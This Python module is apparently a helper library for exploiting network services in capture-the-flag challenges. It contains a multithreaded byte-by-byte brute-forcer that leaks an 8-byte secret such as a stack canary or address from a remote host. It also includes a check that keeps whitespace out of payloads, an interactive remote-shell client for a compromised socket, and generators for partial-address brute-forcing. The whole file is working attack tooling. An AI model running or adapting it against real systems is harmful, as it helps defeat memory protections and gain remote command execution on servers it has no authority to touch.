from struct import pack, unpack
from concurrent.futures import ThreadPoolExecutor
import socket
from libc_db_search import *

to_bytes = lambda x: pack("Q", x)

def from_bytes(x):

    while(len(x) < 8):
        x += b'\x00'

    return unpack("Q", x)[0]

# also checks for newline
def check_whitespaces(payload):

    whitespaces = [b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x20', b'\x85', b'\xa0', b'\n']
    for c in whitespaces:
        if c in payload:
            raise RuntimeError(f"Whitespace character {c} detected in payload; terminating\n")

class Remote_64bitBruteforce:

    def __log_info(self, msg):

        if self.print_log is True:
            print(f"[i] [{self.session_name}] {msg}")

    def __log_warning(self, msg):

        if self.print_log is True:
            print(f"[!] [{self.session_name}] {msg}")

    def __log_success(self, msg):

        if self.print_log is True:
            print(f"[*] [{self.session_name}] {msg}")

    #
    # hits should be a dictionary of the form {byte from [0, 7]: [(lo0, hi0), (lo1, hi1), ...]}
    # where each pair (lo_i, hi_i) indicates a closed interval of values to be tried for that particular byte
    # an interval of the form (val, val) indicates thet only one value (val) should be tried
    # if hits is none, every possible value is tried for every byte
    #
    # byte_check_function(socket, byte_value_to_try, payload_prefix) -> byte (if ok) / None (if not ok)
    def __init__(self, target_ipv4, target_port, byte_check_function, payload_prefix, max_thrcnt=32, hints=None, print_log=True, session_name=None):
        
        self.TARGET_IP = target_ipv4
        self.TARGET_PORT = target_port

        # dictionary of the same form as hits
        self.buteforce_intervals = {}

        if hints is None:
            self.buteforce_intervals = {byte: [(b'\x00', b'\xff')] for byte in range(8)}
        else:
            self.buteforce_intervals = hints
            for b in range(8):
                if b not in self.buteforce_intervals.keys():
                    self.buteforce_intervals.update({b: [(b'\x00', b'\xff')]})

        self.max_thrcnt = max_thrcnt
        
        self.prefix = payload_prefix
        self.leaked = b''

        self.__try_val = byte_check_function
        
        self.print_log = print_log
        self.session_name = session_name

    def __bruteforce_values(self, byte):

        b_hints = self.buteforce_intervals[byte]

        for lo_b, hi_b in b_hints:

            lo = int.from_bytes(lo_b, 'little')
            hi = int.from_bytes(hi_b, 'little')

            for val in range(lo, hi + 1):
                yield val.to_bytes(1, 'little')

    def __bytewise_bruteforce(self, byte):

        tests = []
        
        with ThreadPoolExecutor(self.max_thrcnt) as threadpool:

            for byte_val in self.__bruteforce_values(byte):

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.TARGET_IP, self.TARGET_PORT))
            
                tests.append(threadpool.submit(self.__try_val, sock, byte_val, self.prefix + self.leaked))

            for t in tests:
                
                ok_byte = t.result()
                if ok_byte is not None:
                    
                    self.__log_success(f"Byte {byte} found: {ok_byte}")

                    self.leaked += ok_byte
                    return

            self.__log_warning(f"Could not find any accepted value for byte {byte}; terminating")
            quit()


    def find_value(self):

        self.__log_info(f"Starting bruteforce on {self.TARGET_IP}:{self.TARGET_PORT}...")

        for b in range(8):
            self.__bytewise_bruteforce(b)

        self.__log_success(f"Value leaked: {self.leaked}")
        return self.leaked

def remote_shell(sock: socket.socket, socket_timeout=3, max_recv_dim=4096, rich=False):

    def __simple_interface_thunk():
        
        while(True):
            
            command = input("$ ")

            sock.send(f"{command}\n".encode())

            if command == "exit":
                print("\n[!] Remote shell disconnected")
                break

            try:
                print(sock.recv(max_recv_dim).decode()[:-1])
            except socket.timeout:
                pass
    
    # HAS BUGS
    def __rich_interface_thunk():

        sock.send("whoami\n".encode())
        user = sock.recv(1024).decode()[:-1]

        shell_symbol = None
        if user == "root":
            shell_symbol = "# "
        else:
            shell_symbol = "$ "
        
        current_path = ""

        while(True):

            sock.send("pwd\n".encode())
            current_path = sock.recv(4096).decode()[:-1]
            
            command = input(f"{user}:{current_path}{shell_symbol}")

            sock.send(f"{command}\n".encode())

            if command == "exit":
                print("\n[!] Remote shell disconnected")
                break

            try:
                print(sock.recv(max_recv_dim).decode()[:-1])
            except socket.timeout:
                pass

    try:

        sock.settimeout(socket_timeout)

        if rich is True:
            __rich_interface_thunk()
        else:
            __simple_interface_thunk()
        
    except KeyboardInterrupt:
        print("\n[!] Remote shell disconnected")

    except Exception as err:
        print(f"\n[!] ERROR while executing remote shell: {err.args}")

# generator for all bytes of form 0x?p, where prefix = 0x0p
def bytes_start_with(prefix):

    b = int.from_bytes(prefix, 'little')
    for i in range(16):
        val = ((i << 4) | b)
        yield val.to_bytes(1, 'little')

# generator for all bytes of form 0xs?, where suffix = 0xs0
def bytes_end_with(suffix):

    b = int.from_bytes(suffix, 'little')
    for i in range(16):
        val = (b | i)
        yield val.to_bytes(1, 'little')